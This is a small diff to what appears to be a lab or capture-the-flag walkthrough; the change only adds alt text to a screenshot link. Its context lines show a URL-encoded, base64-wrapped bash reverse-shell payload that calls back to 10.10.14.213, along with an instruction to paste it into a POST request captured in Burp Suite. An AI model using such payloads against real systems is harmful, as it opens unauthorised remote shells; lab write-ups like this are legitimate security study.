@@ -88,7 +88,7 @@ URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx
 
 _Use Burpsuite to capture the POST Request. Then paste in the Payload._
 
-![](https://miro.medium.com/v2/resize:fit:700/1*bU_YiPmMY78G0MGnfcDiOQ.png)
+![image](https://miro.medium.com/v2/resize:fit:700/1*bU_YiPmMY78G0MGnfcDiOQ.png)
 
 Payload:
 
